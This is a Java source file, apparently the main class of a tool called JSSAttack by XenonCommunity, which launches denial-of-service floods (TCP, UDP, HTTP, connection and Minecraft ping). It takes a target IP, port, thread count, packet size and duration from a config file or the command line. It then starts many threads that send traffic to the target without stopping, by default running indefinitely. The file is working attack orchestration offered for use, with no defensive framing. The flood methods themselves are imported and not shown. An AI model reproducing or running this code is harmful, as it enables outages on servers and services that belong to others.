package ir.xenoncommunity.jss;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.methods.impl.*;
import ir.xenoncommunity.jss.utils.*;
import ir.xenoncommunity.jss.utils.filemanager.Value;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import lombok.val;
import org.jetbrains.annotations.NotNull;

import java.net.InetAddress;
import java.time.Duration;
import java.time.LocalTime;
import java.util.concurrent.TimeUnit;

@Getter
@RequiredArgsConstructor
public class JSSAttack implements Runnable {
    public final CommandLineParser parser;

    /**
     * Returns the appropriate attack method based on the provided method, byte size, and attack statics.
     *
     * @param method        the attack method
     * @param byteSize      the size of the attack in bytes
     * @param attackStatics the attack statics
     * @return the appropriate attack method
     */
    @NotNull
    private IAttackMethod getMethod(final String method, final Integer byteSize, AttackStatics attackStatics) {
        return switch (method.toUpperCase()) {
            case "TCPFLOOD", "TCP", "TCP_FLOOD" -> new TCPFlood(attackStatics, byteSize);
            case "HTTPFLOOD", "HTTP", "HTTP_FLOOD" -> new HTTPFlood(attackStatics);
            case "CONNFLOOD", "CONN", "CONN_FLOOD" -> new ConnFlood(attackStatics);
            case "MCPING", "MCPING_FLOOD", "MCPINGFLOOD" -> new MCPingFlood(attackStatics);
            case "UDPFLOOD", "UDP", "UDP_FLOOD" -> new UDPFlood(attackStatics, byteSize);
            default -> throw new IllegalArgumentException("Invalid method: " + method);
        };
    }

    /**
     * Runs the attack with the specified parameters.
     */
    @SneakyThrows
    public void run() {
        // Create local variables for our configuration/run args
        boolean debug = false;
        String ip = null;
        Integer port;
        Integer ppsLimit = null;
        Integer maxThreads = null;
        Integer byteSize = null;
        Integer duration;
        String method = null;
        Boolean verbose = null;
        // Check if user is using config
        if (this.parser.get("--config", String.class, null) != null){
            // to solve the error, there is no purpose
            duration = null;
            port = null;
            // Add values to FileManager
            FileManager.values.add(new Value<>("ip", "0.0.0.0"));
            FileManager.values.add(new Value<>("port", 1024));
            FileManager.values.add(new Value<>("ppsLimit", 1000));
            FileManager.values.add(new Value<>("maxThreads", 5));
            FileManager.values.add(new Value<>("byteSize", 1024));
            FileManager.values.add(new Value<>("method", "TCPFLOOD"));
            FileManager.values.add(new Value<>("verbose", false));
            FileManager.values.add(new Value<>("duration", -1));
            // Init the FileManager
            FileManager.init();
            // Switch between configuration items and set the values
            for(val val : FileManager.values){
                switch(val.getName()){
                    case "ip":{
                        ip = (String) val.getValue();
                        break;
                    }
                    case "port":{
                        port = Integer.parseInt((String) val.getValue());
                        break;
                    }
                    case "ppsLimit":{
                        ppsLimit = Integer.parseInt((String) val.getValue());
                        break;
                    }
                    case "maxThreads":{
                        maxThreads = Integer.parseInt((String) val.getValue());
                        break;
                    }
                    case "byteSize":{
                        byteSize = Integer.parseInt((String) val.getValue());
                        break;
                    }
                    case "method":{
                        method = (String) val.getValue();
                        break;
                    }
                    case "verbose":{
                        verbose = Boolean.parseBoolean((String) val.getValue());
                        break;
                    }
                    case "duration":{
                        duration = Integer.parseInt((String) val.getValue());
                        break;
                    }

                }
            }
        // See If user isn't using configuration and using run args instead
        } else {
            // Clears the entire FileManager values because we don't need them
            FileManager.values.clear();
            // Parse command line arguments
            debug = this.parser.get("--debug", Boolean.class, false);
            ip = this.parser.get("--ip", String.class, null);
            port = this.parser.get("--port", Integer.class, -1);
            ppsLimit = this.parser.get("--pps", Integer.class, -1);
            maxThreads = this.parser.get("--threads", Integer.class, 1000);
            byteSize = this.parser.get("--byteSize", Integer.class, 1500);
            duration = this.parser.get("--duration", Integer.class, -1);
            method = this.parser.get("--method", String.class, "TCPFLOOD");
            verbose = this.parser.get("--verbose", Boolean.class, false);

        }
        // Check if values are null
        if (ip == null) {
            System.out.println("JSSAttack by XenonCommunity");
            System.out.println("Usage: java -jar JSSAttack.jar --ip <ip> --port <port> --threads <threads> --byteSize <byteSize> --duration <duration> --method <method> [--verbose] [--debug]");
            System.exit(0);
        }

        // Set logging level based on verbosity and debug mode
        if (verbose != null && verbose) {
            Logger.setCurrentLevel(Logger.LEVEL.VERBOSE);
        } else if (debug){
            Logger.setCurrentLevel(Logger.LEVEL.DEBUG);
        }

        // Log debug information if debug mode is enabled
        Logger.setSection("DEBUG");
        Logger.log(Logger.LEVEL.DEBUG, "IP is: " + ip);
        Logger.log(Logger.LEVEL.DEBUG, "Port is: " + port);
        Logger.log(Logger.LEVEL.DEBUG, "MaxThreads is: " + maxThreads);
        Logger.log(Logger.LEVEL.DEBUG, "ByteSize is: " + byteSize);
        Logger.log(Logger.LEVEL.DEBUG, "Duration is: " + duration);
        Logger.log(Logger.LEVEL.DEBUG, "Method is: " + method);
        assert maxThreads != null;
        // Initialize task manager
        TaskManager taskManager = new TaskManager(maxThreads + 1);

        // Initialize attack parameters
        final AttackStatics attackStatics = new AttackStatics(ppsLimit);
        assert method != null;
        final IAttackMethod attackMethod = getMethod(method, byteSize, attackStatics);
        final InetAddress addr = InetAddress.getByName(ip);
        Integer finalDuration = duration;
        final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(finalDuration));
        Logger.log(Logger.LEVEL.DEBUG, "addr: " + addr);

        // Start the attack and log thread creation
        Logger.setSection("ATTACK");
        for (int i = 1; i <= maxThreads; i++) {
            Logger.log(Logger.LEVEL.DEBUG, "Adding new thread." + i + " Max: " + maxThreads);

            Integer finalPort = port;
            taskManager.add(() -> {
                do {
                    try {
                        attackMethod.send(addr, finalPort == -1 ? Randomize.randomPort() : finalPort);
                    } catch (Exception ignored) {

                    }
                } while (attackStatics.isRunning());
            });
        }

        // Log start of attack
        Logger.log(Logger.LEVEL.INFO, "Attacking...");

        // Add task to manage statics for each second

        taskManager.add(() -> {
            while (LocalTime.now().isBefore(endTime) || finalDuration == -1) {
                try {
                    TimeUnit.SECONDS.sleep(1);
                    attackStatics.second();
                } catch (InterruptedException e) {
                    e.printStackTrace(System.err);
                }
            }

            attackStatics.setRunning(false);
        });

        // Perform attack for specified duration or indefinitely
        if (duration == -1) {
            taskManager.doTasks(TimeUnit.DAYS, 365);
            Logger.log(Logger.LEVEL.INFO, "Happy new year!");
            return;
        }

        taskManager.doTasks(TimeUnit.SECONDS, duration);
    }

}